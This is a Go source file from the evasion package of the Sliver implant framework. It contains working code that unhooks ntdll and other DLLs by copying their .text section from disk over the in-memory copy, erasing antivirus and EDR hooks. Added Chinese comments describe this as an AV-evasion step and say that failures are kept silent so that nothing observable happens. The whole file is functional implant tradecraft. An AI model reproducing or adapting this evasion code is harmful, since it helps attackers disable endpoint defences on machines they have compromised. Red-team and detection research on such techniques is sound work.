package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"errors"
	"path/filepath"

	"golang.org/x/sys/windows"

	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"debug/pe"
	"unsafe"
)

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	//{{if .Config.Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf, e := x.Data()
	if e != nil {
		return e
	}
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old uint32
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), windows.PAGE_EXECUTE_READWRITE, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	// vsize should always smaller than len(b)
	for i := 0; i < int(vsize); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Config.Debug}}
	log.Println("DLL overwritten")
	//{{end}}
	e = windows.VirtualProtect(uintptr(dllOffset), uintptr(vsize), old, &old)
	if e != nil {
		return e
	}
	//{{if .Config.Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// UnhookNtdll —— 启动早期 ntdll 自恢复（免杀 R-2 v1，方案：
// docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md §二·R-2）：
// 从磁盘 System32\ntdll.dll 读取 .text 覆盖内存节，抹平 EDR 写入的用户态 hook。
// 守卫：磁盘节与内存节的 .text VirtualSize 不一致（补丁版本失配）即放弃，防越界写崩；
// 任何失败静默返回（调用方 recover 兜底），不产生可观测行为差异。
// 已知边界：EDR 对 ntdll .text 有完整性校验时本动作自身可触发告警（上位文档 R-2 风险条款）。
func UnhookNtdll() error {
	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return err
	}
	diskPath := filepath.Join(sysDir, "ntdll.dll")

	f, err := pe.Open(diskPath)
	if err != nil {
		return err
	}
	defer f.Close()
	diskSec := f.Section(".text")
	if diskSec == nil {
		return errors.New("evasion: disk ntdll has no .text section")
	}
	diskData, err := diskSec.Data()
	if err != nil {
		return err
	}
	if diskSec.VirtualSize == 0 || uint64(len(diskData)) < uint64(diskSec.VirtualSize) {
		return errors.New("evasion: disk .text raw data smaller than virtual size")
	}

	dll, err := windows.LoadDLL(diskPath) // ntdll 已加载 → 返回现有模块基址
	if err != nil {
		return err
	}
	base := uintptr(dll.Handle)

	memVA, memSize, ok := imageSectionInfo(base, ".text")
	if !ok {
		return errors.New("evasion: memory ntdll .text not found")
	}
	if memSize != diskSec.VirtualSize {
		// 内存与磁盘版本失配：放弃覆盖（防越界写崩），交由调用方静默
		return errors.New("evasion: ntdll version mismatch, skip unhook")
	}

	var old uint32
	dst := base + uintptr(memVA)
	if err = windows.VirtualProtect(dst, uintptr(memSize), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
		return err
	}
	// RtlMoveMemory 拷贝磁盘 .text → 内存 .text（size 已对账，无越界）
	nt, _, _ := procRtlMoveMemory.Call(dst, uintptr(unsafe.Pointer(&diskData[0])), uintptr(memSize))
	if nt != 0 {
		// RtlMoveMemory 无返回值（void），nt 恒为其首参数误读——仅作占位
		_ = nt
	}
	return windows.VirtualProtect(dst, uintptr(memSize), old, &old)
}

// imageSectionInfo 解析内存 PE 头，返回指定节的 VirtualAddress/VirtualSize。
func imageSectionInfo(base uintptr, want string) (va, vsize uint32, ok bool) {
	// DOS header: e_lfanew @ 0x3C
	eLfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
	// FileHeader: NumberOfSections @ e_lfanew+6, SizeOfOptionalHeader @ e_lfanew+20
	numSections := *(*uint16)(unsafe.Pointer(base + uintptr(eLfanew) + 6))
	sizeOpt := *(*uint16)(unsafe.Pointer(base + uintptr(eLfanew) + 20))
	secTable := base + uintptr(eLfanew) + 24 + uintptr(sizeOpt)
	for i := uint16(0); i < numSections; i++ {
		p := secTable + uintptr(i)*40 // IMAGE_SECTION_HEADER 固定 40 字节
		name := (*[8]byte)(unsafe.Pointer(p))
		if name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't' {
			return *(*uint32)(unsafe.Pointer(p + 12)), *(*uint32)(unsafe.Pointer(p + 8)), true
		}
	}
	return 0, 0, false
}

var procRtlMoveMemory = windows.NewLazyDLL("ntdll.dll").NewProc("RtlMoveMemory")
